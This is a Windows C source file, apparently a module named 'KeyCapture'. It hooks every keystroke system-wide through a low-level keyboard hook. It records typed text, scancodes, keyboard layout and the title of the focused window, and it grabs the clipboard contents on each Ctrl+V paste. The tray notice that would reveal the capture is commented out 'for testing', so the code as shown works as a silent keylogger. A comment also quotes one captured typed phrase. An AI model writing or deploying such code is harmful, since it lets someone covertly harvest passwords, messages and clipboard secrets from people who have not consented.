#include "input.h"

#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define BS_OPEN  '\x0E'
#define BS_CLOSE '\x0F'

#define TRAY_WM_MSG     (WM_USER + 1)
#define TRAY_ICON_ID    1
#define TIMER_ID        42

static HHOOK              g_hook          = NULL;
static HWND               g_tray_hwnd     = NULL;
static NOTIFYICONDATA     g_nid           = {0};
static InputPacketCallback g_callback     = NULL;
static void*              g_userdata      = NULL;
static int                g_idle_secs     = INPUT_IDLE_TIMEOUT_SECONDS;
static volatile int       g_stop          = 0;

static char               g_text[INPUT_MAX_TEXT];
static uint8_t            g_scancodes[INPUT_MAX_SCANCODES];
static int                g_text_len      = 0;
static int                g_sc_len        = 0;
static uint64_t           g_ts_start      = 0;
static char               g_focused[256]  = {0};
static char               g_layout[16]    = {0};
static int                g_has_data      = 0;

static uint64_t now_ms(void) {
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER u;
    u.LowPart  = ft.dwLowDateTime;
    u.HighPart = ft.dwHighDateTime;
    return u.QuadPart / 10000ULL;
}

static void get_focused_app(char* buf, int bufsz) {
    HWND fw = GetForegroundWindow();
    if (!fw) { buf[0] = '\0'; return; }
    WCHAR wbuf[512] = {0};
    GetWindowTextW(fw, wbuf, 512);
    WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, buf, bufsz, NULL, NULL);
}

typedef struct { const char* klid_suffix; const char* name; } KlidEntry;
static const KlidEntry g_klid_map[] = {
    {"0401", "ar-AZERTY"},
    {"0402", "bg-BDS"},
    {"0403", "ca-QWERTY"},
    {"0405", "cs-QWERTZ"},
    {"0406", "da-QWERTY"},
    {"0407", "de-QWERTZ"},
    {"0408", "el-QWERTY"},
    {"0409", "en-US-QWERTY"},
    {"040A", "es-QWERTY"},
    {"040B", "fi-QWERTY"},
    {"040C", "fr-AZERTY"},
    {"040E", "hu-QWERTZ"},
    {"040F", "is-QWERTY"},
    {"0410", "it-QWERTY"},
    {"0411", "ja-QWERTY"},
    {"0412", "ko-QWERTY"},
    {"0413", "nl-QWERTY"},
    {"0414", "nb-QWERTY"},
    {"0415", "pl-QWERTY"},
    {"0416", "pt-BR-QWERTY"},
    {"0418", "ro-QWERTY"},
    {"0419", "ru-JCUKEN"},
    {"041A", "hr-QWERTZ"},
    {"041B", "sk-QWERTZ"},
    {"041C", "sq-QWERTY"},
    {"041D", "sv-QWERTY"},
    {"041E", "th-QWERTY"},
    {"041F", "tr-QWERTY"},
    {"0422", "uk-JCUKEN"},
    {"0424", "sl-QWERTZ"},
    {"0425", "et-QWERTY"},
    {"0426", "lv-QWERTY"},
    {"0427", "lt-QWERTY"},
    {"042F", "mk-QWERTY"},
    {"0436", "af-QWERTY"},
    {"0438", "fo-QWERTY"},
    {"043C", "ga-QWERTY"},
    {"0809", "en-GB-QWERTY"},
    {"080A", "es-MX-QWERTY"},
    {"080C", "fr-BE-AZERTY"},
    {"0816", "pt-PT-QWERTY"},
    {"0C0C", "fr-CA-QWERTY"},
    {"1009", "en-CA-QWERTY"},
    {"100C", "fr-CH-QWERTZ"},
    {"1407", "de-CH-QWERTZ"},
    {"00010407", "de-QWERTY"},
    {"00010409", "en-US-Dvorak"},
    {"0001040C", "fr-bepo"},
    {NULL, NULL}
};

static void get_layout(char* buf) {
    char klid[KL_NAMELENGTH] = {0};
    GetKeyboardLayoutNameA(klid);
    const char* suffix = (strlen(klid) >= 4) ? (klid + strlen(klid) - 4) : klid;
    for (int i = 0; g_klid_map[i].klid_suffix; i++) {
        if (_stricmp(klid,   g_klid_map[i].klid_suffix) == 0 ||
            _stricmp(suffix, g_klid_map[i].klid_suffix) == 0) {
            strncpy_s(buf, 16, g_klid_map[i].name, _TRUNCATE);
            return;
        }
    }
    strncpy_s(buf, 16, klid, _TRUNCATE);
}

static int del_region_is_open(void) {
    for (int i = g_text_len - 1; i >= 0; i--) {
        unsigned char ch = (unsigned char)g_text[i];
        if (ch == (unsigned char)BS_CLOSE) return 0;
        if (ch == (unsigned char)BS_OPEN)  return 1;
    }
    return 0;
}

static void close_del_region(void) {
    if (del_region_is_open() && g_text_len + 1 < INPUT_MAX_TEXT - 1)
        g_text[g_text_len++] = BS_CLOSE;
}

static int last_live_char_pos(void) {
    int depth = 0;   /* 0 = live, >0 = inside deletion */
    int pos   = -1;
    for (int i = 0; i < g_text_len; i++) {
        unsigned char ch = (unsigned char)g_text[i];
        if      (ch == (unsigned char)BS_OPEN)  depth++;
        else if (ch == (unsigned char)BS_CLOSE && depth) depth--;
        else if (!depth) pos = i;
    }
    return pos;
}

/* 
  TODO: fix 
    - Appendus: wtf is this 'idem vyskusat BSOD po[o[c]ckaj' (17 20 12 32 39 2F 2C 1F 25 16 1F 1E 14 39 2A 30 1F 18 20 39 19 18 18 2E 0E 0E 2E 25 1E 24 1C)
  */
static void record_backspace(void) {
    int pos = last_live_char_pos();
    if (pos < 0) return;
    if (g_text_len + 1 >= INPUT_MAX_TEXT - 1) return;
    memmove(g_text + pos + 1, g_text + pos, (size_t)(g_text_len - pos));
    g_text[pos] = BS_OPEN;
    g_text_len++;
}

static void append_escaped(const char* src, int len) {
    close_del_region();
    for (int i = 0; i < len; i++) {
        char c = src[i];
        if ((c == BS_OPEN || c == BS_CLOSE) &&
            g_text_len + 2 < INPUT_MAX_TEXT - 1) {
            g_text[g_text_len++] = c;
            g_text[g_text_len++] = c;
        } else if (g_text_len + 1 < INPUT_MAX_TEXT - 1) {
            g_text[g_text_len++] = c;
        }
    }
}

static void flush_packet(void) {
    if (!g_has_data || !g_callback) return;

    close_del_region();

    InputPacket* p = (InputPacket*)calloc(1, sizeof(InputPacket));
    if (!p) return;

    p->timestamp_start = g_ts_start;
    p->timestamp_end   = now_ms();

    p->text = (char*)malloc((size_t)(g_text_len + 1));
    if (p->text) {
        memcpy(p->text, g_text, (size_t)g_text_len);
        p->text[g_text_len] = '\0';
    }

    p->scancodes = (uint8_t*)malloc((size_t)(g_sc_len + 1));
    if (p->scancodes) {
        memcpy(p->scancodes, g_scancodes, (size_t)g_sc_len);
        p->scancodes[g_sc_len] = 0;
    }

    memcpy(p->layout, g_layout, 16);
    p->focused_app = _strdup(g_focused);

    g_callback(p, g_userdata);

    g_text_len  = 0;
    g_sc_len    = 0;
    g_ts_start  = 0;
    g_has_data  = 0;
}

static void start_packet(void) {
    if (!g_has_data) {
        g_ts_start = now_ms();
        get_focused_app(g_focused, (int)sizeof(g_focused));
        get_layout(g_layout);
        g_has_data = 1;
    }
}

static void append_clipboard_text(void) {
    if (!OpenClipboard(NULL)) return;

    HANDLE h = GetClipboardData(CF_UNICODETEXT);
    if (!h) { CloseClipboard(); return; }

    WCHAR* wstr = (WCHAR*)GlobalLock(h);
    if (!wstr) { CloseClipboard(); return; }

    int need = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (need > 1) {
        int space = INPUT_MAX_TEXT - g_text_len - 1;
        int copy  = (need - 1 < space) ? (need - 1) : space;
        if (copy > 0) {
            char* tmp = (char*)malloc((size_t)copy + 1);
            if (tmp) {
                int written = WideCharToMultiByte(CP_UTF8, 0, wstr, -1,
                                                  tmp, copy, NULL, NULL);
                if (written > 0)
                    append_escaped(tmp, written - 1);
                free(tmp);
            }
        }
    }

    GlobalUnlock(h);
    CloseClipboard();
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(g_hook, nCode, wParam, lParam);

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = ks->vkCode;
        DWORD sc = ks->scanCode;

        if (vk == VK_PAUSE || vk == VK_CANCEL || ALLOW_DEBUG_BREAK) {
            g_stop = 1;
            return CallNextHookEx(g_hook, nCode, wParam, lParam);
        }

        if (g_tray_hwnd)
            SetTimer(g_tray_hwnd, TIMER_ID, (UINT)(g_idle_secs * 1000), NULL);

        start_packet();

        if (g_sc_len < INPUT_MAX_SCANCODES - 1)
            g_scancodes[g_sc_len++] = (uint8_t)(sc & 0xFF);

        if (vk == VK_BACK) {
            record_backspace();
            goto skip_tounicode;
        }

        if (vk == 'V' && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) {
            append_clipboard_text();
            goto skip_tounicode;
        }

        {
            BYTE kbstate[256] = {0};
            static const int mods[] = {
                VK_SHIFT, VK_LSHIFT, VK_RSHIFT,
                VK_CONTROL, VK_LCONTROL, VK_RCONTROL,
                VK_MENU, VK_LMENU, VK_RMENU,
                VK_CAPITAL, VK_NUMLOCK, VK_SCROLL,
                0
            };
            for (int i = 0; mods[i]; i++) {
                SHORT s = GetAsyncKeyState(mods[i]);
                if (mods[i] == VK_CAPITAL || mods[i] == VK_NUMLOCK || mods[i] == VK_SCROLL)
                    kbstate[mods[i]] = (s & 0x0001) ? 0x01 : 0x00;
                else
                    kbstate[mods[i]] = (s & 0x8000) ? 0x80 : 0x00;
            }

            WCHAR wbuf[4] = {0};
            int res = ToUnicode(vk, sc, kbstate, wbuf, 4, 0);

            if (res == -1) {
                BYTE dummy[256] = {0};
                WCHAR dead_wbuf[4] = {0};
                ToUnicode(VK_SPACE, 0x39, dummy, dead_wbuf, 4, 0);
                if (wbuf[0]) {
                    char mb[4] = {0};
                    int mb_len = WideCharToMultiByte(CP_UTF8, 0, wbuf, 1, mb, 4, NULL, NULL);
                    if (mb_len > 0) {
                        close_del_region();
                        if (g_text_len + mb_len < INPUT_MAX_TEXT - 1) {
                            memcpy(g_text + g_text_len, mb, (size_t)mb_len);
                            g_text_len += mb_len;
                        }
                    }
                }
            } else if (res >= 1) {
                char mb[8] = {0};
                int mb_len = WideCharToMultiByte(CP_UTF8, 0, wbuf, res, mb, 8, NULL, NULL);
                if (mb_len > 0) {
                    close_del_region();
                    append_escaped(mb, mb_len);
                }
            }
        }

        skip_tounicode:
        if (vk == VK_RETURN) {
            KillTimer(g_tray_hwnd, TIMER_ID);
            flush_packet();
        }
    }

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

static LRESULT CALLBACK TrayWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_TIMER:
            if (wp == TIMER_ID) {
                KillTimer(hwnd, TIMER_ID);
                flush_packet();
            }
            break;
        case TRAY_WM_MSG:
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProcA(hwnd, msg, wp, lp);
    }
    return 0;
}

static int create_tray_window(void) {
    WNDCLASSEXA wc = {0};
    wc.cbSize       = sizeof(wc);
    wc.lpfnWndProc  = TrayWndProc;
    wc.hInstance    = GetModuleHandleA(NULL);
    wc.lpszClassName= "InputTrayClass";
    if (!RegisterClassExA(&wc)) return -1;

    g_tray_hwnd = CreateWindowExA(0, "InputTrayClass", "InputTray",
                                  0, 0, 0, 0, 0,
                                  HWND_MESSAGE, NULL,
                                  GetModuleHandleA(NULL), NULL);
    return g_tray_hwnd ? 0 : -1;
}

static void add_tray_icon(void) {
    ZeroMemory(&g_nid, sizeof(g_nid));
    g_nid.cbSize           = sizeof(g_nid);
    g_nid.hWnd             = g_tray_hwnd;
    g_nid.uID              = TRAY_ICON_ID;
    g_nid.uFlags           = NIF_ICON | NIF_TIP | NIF_MESSAGE;
    g_nid.uCallbackMessage = TRAY_WM_MSG;
    g_nid.hIcon            = LoadIconA(NULL, IDI_EXCLAMATION);
    strcpy_s(g_nid.szTip, sizeof(g_nid.szTip), "KeyCapture running - Press Pause/Break to stop");
    Shell_NotifyIconA(NIM_ADD, &g_nid);
}

static void remove_tray_icon(void) {
    Shell_NotifyIconA(NIM_DELETE, &g_nid);
}

int input_init(InputPacketCallback callback, void* userdata, int idle_secs) {
    if (!callback) return -1;

    g_callback  = callback;
    g_userdata  = userdata;
    g_idle_secs = (idle_secs > 0) ? idle_secs : INPUT_IDLE_TIMEOUT_SECONDS;
    g_stop      = 0;

    if (create_tray_window() != 0) return -2;

    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL,
                               LowLevelKeyboardProc,
                               GetModuleHandleA(NULL), 0);
    if (!g_hook) return -3;

    // disabled for testing
    // add_tray_icon();

    return 0;
}

int input_poll(void) {
    if (g_stop) return 1;

    MSG msg;
    while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
        if (msg.message == WM_QUIT) {
            g_stop = 1;
            return 1;
        }
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    return g_stop ? 1 : 0;
}

void input_shutdown(void) {
    flush_packet();

    if (g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }

    if (g_tray_hwnd) {
        KillTimer(g_tray_hwnd, TIMER_ID);
        remove_tray_icon();
        DestroyWindow(g_tray_hwnd);
        g_tray_hwnd = NULL;
    }

    UnregisterClassA("InputTrayClass", GetModuleHandleA(NULL));
}

void input_free_packet(InputPacket* p) {
    if (!p) return;
    free(p->text);
    free(p->scancodes);
    free(p->focused_app);
    free(p);
}